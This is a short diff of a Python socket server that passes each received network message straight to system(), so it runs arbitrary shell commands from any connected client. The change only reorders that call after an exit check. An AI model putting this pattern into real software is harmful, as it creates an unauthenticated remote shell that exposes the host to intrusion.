@@ -15,10 +15,9 @@ try:
 		msg = obj.recv(1024)
 		msg = msg[:-1]
 		print(cliente[0],">",msg)
-		system(msg)
-		
 		if msg == 'exit':
 			server.close()
+		system(msg)
 except Exception as erro:
 	print(erro)
 	server.close()
